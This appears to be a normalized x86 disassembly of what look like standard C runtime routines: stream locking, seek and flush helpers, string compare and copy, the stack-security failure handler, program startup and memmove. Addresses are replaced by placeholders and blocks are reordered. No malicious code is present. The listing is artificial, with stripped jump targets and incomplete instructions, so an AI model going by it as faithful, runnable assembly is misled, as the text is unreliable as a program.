call sub_429ad0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_423d87
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423ecb
mov eax edi
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
call sub_429b15
retn
sub_423ed3
push 0x10
push r--data
call sub_429ad0
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x20 ] esi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423f2b
call sub_429b15
retn 0x14
mov ecx edi
call [ ebp + 0x14 ]
add edi ebx
mov [ ebp + 0x8 ] edi
inc esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jge r-xdata
sub_423f3b
push 0xc
push r--data
call sub_429ad0
and [ ebp - 0x1c ] 0x0
mov ebx [ ebp + 0xc ]
mov eax ebx
mov edi [ ebp + 0x10 ]
imul eax edi
mov esi [ ebp + 0x8 ]
add esi eax
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423f9a
call sub_429b15
retn 0x10
sub esi ebx
mov [ ebp + 0x8 ] esi
mov ecx esi
call [ ebp + 0x14 ]
jmp r-xdata
dec edi
mov [ ebp + 0x10 ] edi
js r-xdata
sub_423faa
push 0x14
push r--data
call sub_429ad0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429b15
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_424008
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4266a7
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_4266a7
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_4240a8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_425b56
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4240e7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_425b56
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_424117
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_425cba
pop ecx
pop ebp
retn
sub_424151
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_425cba
pop ecx
pop ebp
retn
sub_42417e
push 0xc
push r--data
call sub_429ad0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_424200
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4241f8
mov eax edi
cmp edi 0x1
je r-xdata
call sub_429b15
retn
cmp edi 0x2
jne r-xdata
sub_424200
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_427b11
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
push ebx
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push esi
call sub_42ecb6
mov ebx [ ebp + 0xc ]
add ebx eax
mov eax [ ebp + 0x10 ]
adc eax edx
pop ecx
xor edi edi
jmp r-xdata
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push esi
mov [ ebp + 0x8 ] eax
call sub_42448b
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push edi
push [ ebp + 0x8 ]
push ebx
push esi
call sub_42b76c
pop ecx
push eax
call sub_42ca87
add esp 0x10
and eax edx
or ecx 0xffffffff
pop ebx
cmp eax ecx
je r-xdata
test al 0x8
je r-xdata
mov eax ecx
jmp r-xdata
xor ecx ecx
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_4242b1
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
pop ebp
retn
push [ ebp + 0x8 ]
call sub_42ec42
mov [ esi ] eax
and eax edx
pop ecx
mov [ esi + 0x4 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_424306
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
pop ebp
retn
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_42417e
add esp 0x10
pop ebp
retn
sub_42433f
push 0x10
push r--data
call sub_429ad0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx 0x4
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_429b15
retn
mov ecx [ ebp + 0x14 ]
lea eax [ ecx - 0x2 ]
cmp eax 0x7ffffffd
ja r-xdata
cmp ebx 0x40
je r-xdata
cmp ebx 0x40
jne r-xdata
and ecx 0xfffffffe
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x20 ] esi
push esi
call sub_4240a8
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_42448b
push esi
call sub_42d231
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test bl 0x4
je r-xdata
mov ecx [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
or ecx 0x4
mov [ esi + 0xc ] ecx
lea eax [ esi + 0x14 ]
push 0x2
pop ebx
jmp r-xdata
or ecx 0x500
mov [ esi + 0xc ] ecx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4266f1
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] edi
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42443d
mov eax edi
sub_424445
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_42448b
pop ecx
test eax eax
je r-xdata
push esi
call sub_42454d
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_42b76c
push eax
call sub_42f061
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_42448b
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_42b76c
pop ecx
push eax
call sub_42c027
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4244f8
push 0xc
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_424445
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424545
mov eax edi
push esi
call sub_42454d
pop ecx
jmp r-xdata
call sub_429b15
retn
sub_42454d
push 0x14
push r--data
call sub_429ad0
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_425b56
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424628
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_429b15
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4240e7
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4245f5
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_424445
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_424445
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_424631
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push 0x0
add ecx 0x2ac18000
push 0x989680
adc eax 0xfe624e21
push eax
push ecx
call sub_427d30
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_424680
push 0xc
push r--data
call sub_429ad0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
xor eax eax
cmp [ ebx ] al
setne al
test eax eax
je r-xdata
call sub_429b15
retn
call sub_42a26c
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi ] 0x0
jne r-xdata
call sub_427b11
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_42f147
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42473c
mov eax edi
call sub_427b11
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_42a620
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_424759
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
xor eax eax
pop ebp
retn
sub_4247b2
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] eax
je r-xdata
push esi
push eax
call sub_42f6c3
push [ ebp - 0x4 ]
mov esi eax
call sub_422732
pop ecx
pop ecx
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_423412
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
leave
retn
sub_4247f2
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_42f4f6
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_42f995
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_42e6c2
mov [ esi + 0x4 ] eax
sub_42487a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_422732
pop ecx
sub_424898
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42492b
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_42492b
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_4247f2
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0x10 ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_43094a
movzx edi ax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
lea ebx [ ebx + 0x2 ]
call sub_43094a
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_424a04
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_427b11
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
mov [ ecx ] 0x0
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ebx ] dl
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
mov al [ esi ]
mov [ ebx + esi ] al
inc esi
test al al
je r-xdata
jmp r-xdata
mov al [ esi + ebx ]
mov [ ebx ] al
inc ebx
test al al
je r-xdata
mov [ ecx ] 0x0
call sub_427b11
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ ecx + eax - 0x1 ] 0x0
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
sub_424aa8
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_427b11
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_427b11
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
sub_424b66
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_4309fc
push [ ebp + 0x8 ]
call sub_427886
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_427871
pop ecx
pop ebp
retn
push 0x1
call sub_4309fc
pop ecx
sub_424ba3
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_424b66
leave
retn
push 0x2
pop ecx
int 0x29
sub_424ca8
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_424b66
leave
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_424d8e
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
call sub_42aa2f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_42a772
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov [ ecx ] bl
mov ecx [ ebp - 0x20 ]
inc ecx
mov [ ebp - 0x20 ] ecx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_42a772
pop ecx
pop ecx
mov [ ecx ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
sub_424e30
push 0x14
push r--data
call sub_429ad0
call sub_427597
movzx esi ax
push 0x2
call sub_430ec9
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_42a0c1
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_42f630
test eax eax
jne r-xdata
push 0x1c
call sub_424f80
cmp [ eax + r--data ] ebx
setne bl
call sub_42dfaa
and [ ebp - 0x4 ] 0x0
call sub_42cc2b
test eax eax
jns r-xdata
push 0x10
call sub_424f80
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_430fb0
mov [ rw-data ] eax
call sub_430bae
test eax eax
jns r-xdata
push 0x1b
call sub_424f80
call sub_430de7
test eax eax
jns r-xdata
push 0x8
call sub_42350a
push 0x1
call sub_423544
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_42350a
call sub_43100b
push esi
push eax
push 0x0
push __dos_header
call sub_4209c0
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_42350a
call sub_423535
jmp r-xdata
push esi
call sub_4237a0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_429b15
retn
sub_424fc0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_425494 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_425398 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_425494 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_42520c ]
jmp [ ecx * 4 + jump_table_42528c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4252f8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
